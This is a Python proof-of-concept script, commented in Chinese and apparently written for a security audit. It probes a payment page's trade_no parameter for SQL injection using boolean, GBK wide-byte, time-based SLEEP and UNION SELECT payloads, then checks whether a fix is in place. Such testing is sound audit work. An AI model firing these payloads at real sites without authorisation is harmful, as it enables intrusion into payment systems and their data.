#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL注入漏洞测试POC
测试目标：cashier.php 文件的 trade_no 参数

使用方法：
    python3 test_sql_injection.py http://your-domain.com

作者：安全审计团队
日期：2026-02-07
"""

import sys
import time
import requests
import base64
from urllib.parse import quote
from typing import Tuple, Dict

class SQLInjectionTester:
    def __init__(self, domain: str):
        """初始化测试器"""
        self.domain = domain.rstrip('/')
        self.target_url = f"{self.domain}/cashier.php"
        self.sitename_b64 = base64.b64encode(b"test").decode()
        self.results = {
            'basic': False,
            'gbk_widebyte': False,
            'time_blind': False,
            'union': False,
            'vulnerable': False
        }

    def test_basic_injection(self) -> bool:
        """测试1：基础SQL注入（单引号）"""
        print("\n[测试1] 基础SQL注入测试...")
        print("-" * 60)

        # 正常请求作为基准
        normal_payload = "test123"
        params_normal = {
            'trade_no': normal_payload,
            'sitename': self.sitename_b64
        }

        try:
            response_normal = requests.get(self.target_url, params=params_normal, timeout=5)
            normal_content = response_normal.text

            # SQL注入测试
            sqli_payload = "test' OR '1'='1"
            params_sqli = {
                'trade_no': sqli_payload,
                'sitename': self.sitename_b64
            }

            response_sqli = requests.get(self.target_url, params=params_sqli, timeout=5)
            sqli_content = response_sqli.text

            # 检查是否返回了SQL错误或异常行为
            sql_errors = [
                'sql syntax',
                'mysql_fetch',
                'mysqli',
                'unclosed quotation',
                'quoted string',
                'syntax error'
            ]

            has_sql_error = any(error.lower() in sqli_content.lower() for error in sql_errors)

            # 检查响应是否有明显差异
            different_response = len(sqli_content) != len(normal_content)

            if has_sql_error:
                print("✗ 发现SQL错误信息泄露")
                print(f"  错误片段：{sqli_content[:200]}")
                self.results['basic'] = True
                return True
            elif different_response:
                print("⚠ 响应内容存在差异，可能存在注入")
                print(f"  正常响应长度：{len(normal_content)}")
                print(f"  注入响应长度：{len(sqli_content)}")
                self.results['basic'] = True
                return True
            else:
                print("✓ 未检测到明显的基础注入特征")
                return False

        except requests.exceptions.Timeout:
            print("✗ 请求超时")
            return False
        except Exception as e:
            print(f"✗ 测试出错：{str(e)}")
            return False

    def test_gbk_widebyte(self) -> bool:
        """测试2：GBK宽字节注入"""
        print("\n[测试2] GBK宽字节注入测试...")
        print("-" * 60)
        print("原理：%df%27 在GBK编码下可绕过addslashes转义")

        # GBK宽字节注入 payload
        # addslashes会将 ' 转义为 \'
        # 但 %df\' 在GBK中会被解释为 運'，从而绕过转义
        gbk_payload = "test%df' OR 1=1--"

        params = {
            'trade_no': gbk_payload,
            'sitename': self.sitename_b64
        }

        try:
            response = requests.get(self.target_url, params=params, timeout=5)
            content = response.text

            # 检查是否成功绕过
            success_indicators = [
                '订单',
                'order',
                'sql',
                'error'
            ]

            has_indicator = any(indicator.lower() in content.lower() for indicator in success_indicators)

            if 'syntax' in content.lower() or 'error' in content.lower():
                print("✗ 检测到SQL语法错误，存在宽字节注入漏洞！")
                print(f"  响应片段：{content[:200]}")
                self.results['gbk_widebyte'] = True
                return True
            elif has_indicator:
                print("⚠ 响应包含异常内容，可能存在注入")
                self.results['gbk_widebyte'] = True
                return True
            else:
                print("✓ 未检测到宽字节注入")
                return False

        except Exception as e:
            print(f"✗ 测试出错：{str(e)}")
            return False

    def test_time_based_blind(self) -> bool:
        """测试3：时间盲注"""
        print("\n[测试3] 时间盲注测试...")
        print("-" * 60)
        print("原理：如果SQL被执行，SLEEP()函数会导致响应延迟")

        # 正常请求计时
        normal_payload = "test123"
        params_normal = {
            'trade_no': normal_payload,
            'sitename': self.sitename_b64
        }

        try:
            start_time = time.time()
            response_normal = requests.get(self.target_url, params=params_normal, timeout=10)
            normal_time = time.time() - start_time
            print(f"  正常请求耗时：{normal_time:.2f}秒")

            # 时间盲注 payload（延迟3秒）
            time_payload = "test' AND SLEEP(3)--"
            params_time = {
                'trade_no': time_payload,
                'sitename': self.sitename_b64
            }

            start_time = time.time()
            response_time = requests.get(self.target_url, params=params_time, timeout=10)
            delay_time = time.time() - start_time
            print(f"  注入请求耗时：{delay_time:.2f}秒")

            # 如果延迟时间明显增加（>=2.5秒），说明SLEEP被执行
            if delay_time - normal_time >= 2.5:
                print(f"✗ 响应延迟 {delay_time - normal_time:.2f}秒，存在时间盲注漏洞！")
                self.results['time_blind'] = True
                return True
            else:
                print("✓ 未检测到时间盲注")
                return False

        except requests.exceptions.Timeout:
            print("⚠ 请求超时（可能是SLEEP执行成功）")
            self.results['time_blind'] = True
            return True
        except Exception as e:
            print(f"✗ 测试出错：{str(e)}")
            return False

    def test_union_injection(self) -> bool:
        """测试4：联合查询注入"""
        print("\n[测试4] 联合查询注入测试...")
        print("-" * 60)

        # UNION SELECT 注入
        union_payload = "-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"

        params = {
            'trade_no': union_payload,
            'sitename': self.sitename_b64
        }

        try:
            response = requests.get(self.target_url, params=params, timeout=5)
            content = response.text

            # 检查是否成功执行UNION
            if any(str(i) in content for i in range(1, 21)):
                print("✗ 检测到数字回显，存在联合查询注入漏洞！")
                print(f"  响应片段：{content[:300]}")
                self.results['union'] = True
                return True
            elif 'syntax' in content.lower():
                print("⚠ SQL语法错误，可能字段数不匹配")
                return False
            else:
                print("✓ 未检测到联合查询注入")
                return False

        except Exception as e:
            print(f"✗ 测试出错：{str(e)}")
            return False

    def check_if_fixed(self) -> bool:
        """检查漏洞是否已修复"""
        print("\n[验证] 检查漏洞是否已修复...")
        print("-" * 60)

        # 测试修复后的特征：订单号格式验证
        test_payloads = [
            "test'--",
            "test%df'",
            "test' OR 1=1--",
            "test' UNION SELECT 1--"
        ]

        fixed_indicators = 0

        for payload in test_payloads:
            params = {
                'trade_no': payload,
                'sitename': self.sitename_b64
            }

            try:
                response = requests.get(self.target_url, params=params, timeout=5)
                content = response.text

                # 修复后的特征：
                # 1. 返回"订单号格式错误"
                # 2. 返回"订单不存在"（说明参数被正确过滤）
                # 3. 没有SQL错误信息
                if '格式错误' in content or '订单号格式错误' in content:
                    fixed_indicators += 1
                elif '订单不存在' in content and 'sql' not in content.lower():
                    fixed_indicators += 1

            except Exception:
                pass

        if fixed_indicators >= len(test_payloads) * 0.75:  # 75%的测试显示已修复
            print("✓ 检测到输入验证机制，漏洞可能已修复")
            return True
        else:
            print("✗ 未检测到有效的修复措施")
            return False

    def run_all_tests(self) -> Dict:
        """运行所有测试"""
        print("=" * 60)
        print("SQL注入漏洞自动化测试工具")
        print("=" * 60)
        print(f"目标URL：{self.target_url}")
        print(f"测试时间：{time.strftime('%Y-%m-%d %H:%M:%S')}")

        # 运行所有测试
        self.test_basic_injection()
        self.test_gbk_widebyte()
        self.test_time_based_blind()
        self.test_union_injection()

        # 判断是否存在漏洞
        self.results['vulnerable'] = any([
            self.results['basic'],
            self.results['gbk_widebyte'],
            self.results['time_blind'],
            self.results['union']
        ])

        # 如果存在漏洞，检查是否已修复
        is_fixed = False
        if self.results['vulnerable']:
            is_fixed = self.check_if_fixed()

        # 输出最终结果
        self.print_final_report(is_fixed)

        return self.results

    def print_final_report(self, is_fixed: bool):
        """打印最终报告"""
        print("\n")
        print("=" * 60)
        print("测试结果汇总")
        print("=" * 60)

        print(f"\n基础注入测试：     {'✗ 存在漏洞' if self.results['basic'] else '✓ 未发现'}")
        print(f"宽字节注入测试：   {'✗ 存在漏洞' if self.results['gbk_widebyte'] else '✓ 未发现'}")
        print(f"时间盲注测试：     {'✗ 存在漏洞' if self.results['time_blind'] else '✓ 未发现'}")
        print(f"联合查询注入测试： {'✗ 存在漏洞' if self.results['union'] else '✓ 未发现'}")

        print("\n" + "=" * 60)
        if self.results['vulnerable']:
            print("⚠ 最终结论：存在SQL注入漏洞！")
            print("=" * 60)
            print(f"\n修复状态：{'✓ 已修复' if is_fixed else '✗ 未修复'}")

            if not is_fixed:
                print("\n建议修复方案：")
                print("1. 使用PDO预处理语句替代字符串拼接")
                print("2. 对订单号进行格式验证（白名单）")
                print("3. 参考：docs/SQL注入测试与修复.md")
        else:
            print("✓ 最终结论：未发现SQL注入漏洞")
            print("=" * 60)
            print("\n当前系统已采取安全措施")

        print("\n详细测试报告已保存在当前目录\n")


def main():
    """主函数"""
    if len(sys.argv) < 2:
        print("使用方法：")
        print("  python3 test_sql_injection.py http://your-domain.com")
        print("\n示例：")
        print("  python3 test_sql_injection.py http://example.com")
        print("  python3 test_sql_injection.py https://pay.example.com")
        sys.exit(1)

    domain = sys.argv[1]

    # 验证域名格式
    if not domain.startswith('http://') and not domain.startswith('https://'):
        print("错误：域名必须以 http:// 或 https:// 开头")
        sys.exit(1)

    # 创建测试器并运行
    tester = SQLInjectionTester(domain)
    results = tester.run_all_tests()

    # 返回退出码（0=安全，1=存在漏洞）
    sys.exit(1 if results['vulnerable'] else 0)


if __name__ == '__main__':
    main()
